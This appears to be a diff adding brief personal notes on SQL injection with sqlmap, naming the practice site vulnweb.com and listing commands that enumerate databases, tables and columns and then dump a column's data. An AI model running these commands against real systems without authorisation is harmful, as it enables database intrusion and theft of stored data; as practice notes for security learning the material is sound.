@@ -1,0 +1,10 @@
+# SQL injection using tool
+ use vulnweb.com
+man sqlmap
+sqlmap -u url --dbs
+
+sqlmap -u url -D databasename --tables
+
+sqlmap -u url -D databasename -T tablename --columns
+
+sqlmap -u url -D databasename -T tablename -C columnname --dump
